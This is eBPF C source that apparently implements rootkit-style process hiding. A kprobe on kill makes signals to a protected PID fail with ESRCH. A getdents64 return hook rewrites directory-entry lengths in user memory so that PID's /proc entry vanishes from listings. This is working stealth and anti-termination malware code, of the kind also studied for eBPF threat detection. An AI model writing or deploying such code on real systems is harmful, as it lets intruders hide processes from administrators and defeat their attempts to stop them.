#define __TARGET_ARCH_x86
#define ESRCH 3

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

 // Share my PID with the eBPF program via a map
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} loader_pid SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, __u64);
} map_bufs SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, __u32);
} map_bytes_read SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, __u64);
} map_to_patch SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

// Must always include a license
char LICENSE[] SEC("license") = "GPL";

SEC("kprobe/__x64_sys_kill")
int kill_enter(struct pt_regs *ctx)
{
    // Read the syscall arguments
    struct pt_regs *sys_regs = (struct pt_regs *)PT_REGS_PARM1(ctx);
    unsigned long di, si;
    bpf_probe_read_kernel(&di, sizeof(di), &sys_regs->di);
    bpf_probe_read_kernel(&si, sizeof(si), &sys_regs->si);
    
    pid_t pid = (pid_t)di;
    int sig = (int)si;
    
    // Read the PID to protect from the map
    __u32 key = 0;
    __u32 *blocked_pid_ptr = bpf_map_lookup_elem(&loader_pid, &key);
    if (!blocked_pid_ptr) {
        bpf_printk("Couldn't load protected PID from map!");
        return 0;
    }

    if (pid == *blocked_pid_ptr) {
        bpf_printk("Caught call to protected PID %u", *blocked_pid_ptr);
        bpf_override_return(ctx, -ESRCH);
    }

    return 0;
}

SEC("kprobe/__x64_sys_getdents64")
int enter_getdents64(struct pt_regs *ctx)
{
    // Read syscall arguments
    struct pt_regs *sys_regs = (struct pt_regs*)PT_REGS_PARM1(ctx);
    unsigned long di, si, dx;
    bpf_probe_read_kernel(&di, sizeof(di), &sys_regs->di);
    bpf_probe_read_kernel(&si, sizeof(si), &sys_regs->si);
    bpf_probe_read_kernel(&dx, sizeof(dx), &sys_regs->dx);

    unsigned int fd = (unsigned int)di;
    struct linux_dirent64 *dirent = (struct linux_dirent64 *)si;
    unsigned int count = (unsigned int)dx;

    // Store the dirent for kretprobe keyed by the pid_tgid
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    bpf_map_update_elem(&map_bufs, &pid_tgid, &dirent, BPF_ANY);

    return 0;
}

static __always_inline void patch_dirent(struct linux_dirent64 *prev, __u16 offset)
{
    // Add the offset to the previous dirent to skip our entry we want to hide
    __u16 prev_d_reclen = 0;
    int ret = bpf_probe_read_user(&prev_d_reclen, sizeof(prev_d_reclen), &prev->d_reclen);
    if (ret != 0) {
        bpf_printk("Failed to read prev d_reclen: %d", ret);
    }
    bpf_printk("Extending prev d_reclen of %u by %u", prev_d_reclen, offset);
    
    prev_d_reclen += offset;
    bpf_probe_write_user(&prev->d_reclen, &prev_d_reclen, sizeof(prev_d_reclen));
}

SEC("kretprobe/__x64_sys_getdents64")
int exit_getdents64(struct pt_regs *ctx)
{
    int err;
    long ret = PT_REGS_RC(ctx);
    if (ret <= 0) {
        return 0;
    }

    // Get the PID to block access to
    __u32 key = 0;
    __u32 *blocked_pid_ptr = bpf_map_lookup_elem(&loader_pid, &key);

    // Get the stored dirent pointer from kprobe
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u64 *buf = bpf_map_lookup_elem(&map_bufs, &pid_tgid);
    if (buf == 0) {
        bpf_printk("kretprobe __x64_sys_getdents64 coulnd't read dirent from map_bufs");
        return 0;
    }

    // Loop variables
    struct linux_dirent64 *dirent = 0;
    struct linux_dirent64 *prev_dirent = 0;
    __u16 d_reclen;
    char filename[64];

    __u32 buf_pos = 0;
    __u32 *buf_pos_ptr = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (buf_pos_ptr != 0) {
        buf_pos = *buf_pos_ptr;
    }

    // Read first entry
    for (int i = 0; i < 1024; i++) {
        // Check if we've read everything
        if (buf_pos >= ret) {
            return 0;
        }

        // Advance to the next directory entry in the buffer
        dirent = (struct linux_dirent64 *)(*buf + buf_pos);

        // Safely read the directory entry size
        err = bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirent->d_reclen);
        if(err!= 0) {
            bpf_printk("kretprobe __x64_sys_getdents64 coulnd't read dirent->d_reclen: %d", err);
            return 0;
        }

        // Safely read the directory name
        int len = bpf_probe_read_user_str(&filename, sizeof(filename), dirent->d_name);
        if (len < 0) {
            bpf_printk("kretprobe __x64_sys_getdents64 coulnd't read dirent->d_name: %d", len);
            return 0;
        }

        // Verbose logging:
        // bpf_printk("d_reclen %u filename %s", d_reclen, filename);

        // Compare the filename with the PID to block
        unsigned long result;
        long res = bpf_strtoul(filename, sizeof(filename), 10, &result);
        if (res >= 0) {
            if (result == *blocked_pid_ptr) {
                bpf_printk("Blocking getdents64 to protected PID: %u", *blocked_pid_ptr);

                bpf_map_delete_elem(&map_bufs, &pid_tgid);
                bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
                patch_dirent(prev_dirent, d_reclen);
                return 0;
            }
        }

        // Store previous dirent for patching
        prev_dirent = dirent;
        
        // Add to offset for next read
        buf_pos += d_reclen;
    }

    // Cleanup
    bpf_map_delete_elem(&map_bufs, &pid_tgid);
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);

    // TODO: Somehow return the updated count of bytes
    return 0;
}